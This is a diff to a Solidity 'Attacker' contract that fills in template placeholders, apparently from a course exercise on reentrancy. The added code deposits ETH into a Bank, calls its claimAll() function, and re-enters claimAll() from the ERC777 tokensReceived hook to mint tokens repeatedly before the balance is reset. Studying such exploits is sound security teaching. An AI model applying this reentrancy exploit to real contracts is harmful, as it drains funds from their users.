@@ -37,6 +37,13 @@ contract Attacker is AccessControl, IERC777Recipient {
 	function attack(uint256 amt) payable public {
       require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO START ATTACK GOES HERE
+		// Step 1: Deposit ETH to get a balance in the Bank
+		bank.deposit{value: amt}();
+		
+		// Step 2: Call the vulnerable claimAll() function
+		// This will mint MCITR tokens and send them to this contract
+		// which triggers tokensReceived() and allows reentrancy
+		bank.claimAll();
 	}
 
 	/*
@@ -60,6 +67,16 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bytes calldata operatorData
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
+		// Only recurse if we haven't reached max depth
+		// and only if the sender is the bank's token (security check)
+		if (depth < max_depth && msg.sender == address(bank.token())) {
+			depth++;
+			emit Recurse(depth);
+			// Call claimAll() again while the Bank's balance hasn't been updated yet
+			// This exploits the vulnerability: the Bank mints tokens before setting balance to 0
+			bank.claimAll();
+			depth--;
+		}
 	}
 
 }
